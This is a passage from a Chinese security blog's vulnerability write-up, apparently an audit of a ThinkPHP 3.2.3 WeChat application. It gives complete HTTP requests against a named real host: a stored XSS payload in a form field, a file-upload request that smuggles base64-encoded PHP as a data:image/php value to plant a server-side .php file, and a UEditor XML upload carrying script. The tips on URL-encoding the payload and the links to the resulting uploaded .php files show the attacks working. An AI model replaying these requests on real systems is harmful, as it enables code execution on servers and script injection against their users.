</span>PHPSESSID=15glkgrrarhv69ruqodvimf0s0</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Google Chrome&quot;;v=&quot;101&quot;, &quot;Chromium&quot;;v=&quot;101&quot;, &quot;Not=A?Brand&quot;;v=&quot;24&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"></span><br><span class="line"><span class="language-xquery">appid=<span class="number">1002</span>&amp;appname=<span class="number">123</span>&amp;imappid=<span class="number">1000011</span>&amp;aeskey=+WxZJSW-_edcs_fMryWu3OM7QFAi5cMXH27aKdgYc2CI&amp;summary=<span class="meta">%E5</span><span class="meta">%AD</span><span class="meta">%A6</span><span class="meta">%E5</span><span class="meta">%91</span><span class="meta">%98</span><span class="meta">%E6</span><span class="meta">%B3</span><span class="meta">%A8</span><span class="meta">%E5</span><span class="meta">%86</span><span class="meta">%8C</span><span class="meta">%E7</span><span class="meta">%94</span><span class="meta">%B3</span><span class="meta">%E8</span><span class="meta">%AF</span><span class="meta">%B7</span><span class="built_in">&amp;sort</span>=<span class="number">1002</span><span class="built_in">&amp;path</span>=&lt;img src=x onerror=alert(<span class="number">1</span>)&gt;</span></span><br></pre></td></tr></table></figure>





<h5 id="文件上传getshell"><a href="#文件上传getshell" class="headerlink" title="文件上传getshell"></a>文件上传getshell</h5><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/Index/UploadPic/UploadsCoverImageAction</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>wechat.dcdx.cn</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>54</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=15glkgrrarhv69ruqodvimf0s0</span><br><span class="line"></span><br><span class="line"><span class="language-ini"><span class="attr">photo</span>=data:image/php<span class="comment">;base64,PD9waHAgcGhwaW5mbygpOz8%2B</span></span></span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://imgse.com/i/ppDoUk8"><img src="https://s1.ax1x.com/2023/03/25/ppDoUk8.png" alt="ppDoUk8.png"></a></p>
<p>这里我们对其进行base64后，后面的+是要进行url编码的，即%2B</p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/ppDodfg"><img src="https://s1.ax1x.com/2023/03/25/ppDodfg.png" alt="ppDodfg.png"></a></p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/ppDoBlj"><img src="https://s1.ax1x.com/2023/03/25/ppDoBlj.png" alt="ppDoBlj.png"></a></p>
<p><a target="_blank" rel="noopener" href="http://wechatimg.dcdx.cn//img//202303//25//1679748345.php">http://wechatimg.dcdx.cn//img//202303//25//1679748345.php</a></p>
<p>当然，如果你不想加也可以，因为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php phpinfo();</span><br></pre></td></tr></table></figure>

<p>写也是可以的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAgcGhwaW5mbygpOw==</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://imgse.com/i/ppDoymq"><img src="https://s1.ax1x.com/2023/03/25/ppDoymq.png" alt="ppDoymq.png"></a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:\/\/wechatimg.dcdx.cn\/img\/202303\/25\/1679748541.php</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://imgse.com/i/ppDoH76"><img src="https://s1.ax1x.com/2023/03/25/ppDoH76.png" alt="ppDoH76.png"></a></p>
<p>随便挖几个…都差不多挺简单的</p>
<h5 id="文件上传xml打XSS（百度编辑器）"><a href="#文件上传xml打XSS（百度编辑器）" class="headerlink" title="文件上传xml打XSS（百度编辑器）"></a>文件上传xml打XSS（百度编辑器）</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">POST /pag/js/common/ueditor/php/controller.php?action=uploadfile&amp;encode=utf-8 HTTP/1.1</span><br><span class="line">Host: wechat.dcdx.cn</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">X_Requested_With: XMLHttpRequest</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------243797712635407223914076753472</span><br><span class="line">Content-Length: 984</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">-----------------------------243797712635407223914076753472</span><br><span class="line">Content-Disposition: form-data; name=&quot;id&quot;</span><br><span class="line"></span><br><span class="line">WU_FILE_0</span><br><span class="line">-----------------------------243797712635407223914076753472</span><br><span class="line">Content-Disposition: form-data; name=&quot;name&quot;</span><br><span class="line"></span><br><span class="line">2020.jpg</span><br><span class="line">-----------------------------243797712635407223914076753472</span><br><span class="line">Content-Disposition: form-data; name=&quot;type&quot;</span><br><span class="line"></span><br><span class="line">image/jpeg</span><br><span class="line">-----------------------------243797712635407223914076753472</span><br><span class="line">Content-Disposition: form-data; name=&quot;lastModifiedDate&quot;</span><br><span class="line"></span><br><span class="line">2023/3/25 20:50:33</span><br><span class="line">-----------------------------243797712635407223914076753472</span><br><span class="line">Content-Disposition: form-data; name=&quot;size&quot;</span><br><span class="line"></span><br><span class="line">106387</span><br><span class="line">-----------------------------243797712635407223914076753472</span><br><span class="line">Content-Disposition: form-data; name=&quot;upfile&quot;; filename=&quot;2020.xml&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">something:script</span> <span class="attr">xmlns:something</span>=<span class="string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;</span></span><br><span class="line">alert(&quot;test&quot;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">something:script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">-----------------------------243797712635407223914076753472--</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://imgse.com/i/ppD7mGD"><img src="https://s1.ax1x.com/2023/03/25/ppD7mGD.png" alt="ppD7mGD.png"></a></p>
<h5 id="SSRF-编辑器导致的"><a href="#SSRF-编辑器导致的" class="headerlink" title="SSRF-编辑器导致的"></a>SSRF-编辑器导致的</h5>
  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/">Projects</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E5%A5%97"><span class="toc-number">1.</span> <span class="toc-text">第一套</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%AF%87"><span class="toc-number">1.1.</span> <span class="toc-text">文件上传篇</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B6%8A%E6%9D%83%E7%AF%87"><span class="toc-number">1.2.</span> <span class="toc-text">越权篇</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B6%8A%E6%9D%83%E7%AF%87-1"><span class="toc-number">1.3.</span> <span class="toc-text">越权篇</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SSRF%E7%AF%87"><span class="toc-number">1.4.</span> <span class="toc-text">SSRF篇</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%AF%87%EF%BC%88%E5%B0%91%E6%8C%96%E5%87%A0%E4%B8%AA%E4%BB%A3%E8%A1%A8%E6%80%A7%E7%9A%84%EF%BC%8CSQL%E6%95%B0%E9%87%8F%E6%AF%94%E8%BE%83%E5%A4%9A%EF%BC%89"><span class="toc-number">1.5.</span> <span class="toc-text">SQL注入篇（少挖几个代表性的，SQL数量比较多）</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%90%8E%E5%8F%B0"><span class="toc-number">1.5.1.</span> <span class="toc-text">后台</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%89%8D%E5%8F%B0"><span class="toc-number">1.5.2.</span> <span class="toc-text">前台</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%98%E5%82%A8XSS%E7%AF%87"><span class="toc-number">1.6.</span> <span class="toc-text">存储XSS篇</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84XSS%E7%AF%87"><span class="toc-number">1.7.</span> <span class="toc-text">反射XSS篇</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E5%A5%97"><span class="toc-number">2.</span> <span class="toc-text">第二套</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84XSS"><span class="toc-number">2.0.1.</span> <span class="toc-text">反射XSS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84XSS-2"><span class="toc-number">2.0.2.</span> <span class="toc-text">反射XSS * 2</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">2.0.3.</span> <span class="toc-text">SQL注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5-2"><span class="toc-number">2.0.4.</span> <span class="toc-text">SQL注入 * 2</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5-3"><span class="toc-number">2.0.5.</span> <span class="toc-text">SQL注入 * 3</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%9E%8B%E5%8F%B7%E8%B6%8A%E6%9D%83-%E8%BA%AB%E4%BB%BD%E8%AF%81"><span class="toc-number">2.0.6.</span> <span class="toc-text">查看型号越权-身份证</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84XSS-3"><span class="toc-number">2.0.7.</span> <span class="toc-text">反射XSS * 3</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0getshell"><span class="toc-number">2.0.8.</span> <span class="toc-text">文件上传getshell</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0xml%E6%89%93XSS%EF%BC%88%E7%99%BE%E5%BA%A6%E7%BC%96%E8%BE%91%E5%99%A8%EF%BC%89"><span class="toc-number">2.0.9.</span> <span class="toc-text">文件上传xml打XSS（百度编辑器）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SSRF-%E7%BC%96%E8%BE%91%E5%99%A8%E5%AF%BC%E8%87%B4%E7%9A%84"><span class="toc-number">2.0.10.</span> <span class="toc-text">SSRF-编辑器导致的</span></a></li></ol></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/04/25/%E5%9F%BA%E4%BA%8Etp3-2-3%E6%A1%86%E6%9E%B6%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-0/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/04/25/%E5%9F%BA%E4%BA%8Etp3-2-3%E6%A1%86%E6%9E%B6%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-0/&text=基于tp3-2-3框架的代码审计_0"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/04/25/%E5%9F%BA%E4%BA%8Etp3-2-3%E6%A1%86%E6%9E%B6%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-0/&title=基于tp3-2-3框架的代码审计_0"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/04/25/%E5%9F%BA%E4%BA%8Etp3-2-3%E6%A1%86%E6%9E%B6%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-0/&is_video=false&description=基于tp3-2-3框架的代码审计_0"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=基于tp3-2-3框架的代码审计_0&body=Check out this article: http://example.com/2023/04/25/%E5%9F%BA%E4%BA%8Etp3-2-3%E6%A1%86%E6%9E%B6%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-0/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/04/25/%E5%9F%BA%E4%BA%8Etp3-2-3%E6%A1%86%E6%9E%B6%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-0/&title=基于tp3-2-3框架的代码审计_0"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/04/25/%E5%9F%BA%E4%BA%8Etp3-2-3%E6%A1%86%E6%9E%B6%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-0/&title=基于tp3-2-3框架的代码审计_0"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/04/25/%E5%9F%BA%E4%BA%8Etp3-2-3%E6%A1%86%E6%9E%B6%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-0/&title=基于tp3-2-3框架的代码审计_0"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/04/25/%E5%9F%BA%E4%BA%8Etp3-2-3%E6%A1%86%E6%9E%B6%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-0/&title=基于tp3-2-3框架的代码审计_0"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/04/25/%E5%9F%BA%E4%BA%8Etp3-2-3%E6%A1%86%E6%9E%B6%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-0/&name=基于tp3-2-3框架的代码审计_0&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/04/25/%E5%9F%BA%E4%BA%8Etp3-2-3%E6%A1%86%E6%9E%B6%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-0/&t=基于tp3-2-3框架的代码审计_0"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2021-2023
    塔菲
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/">Projects</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
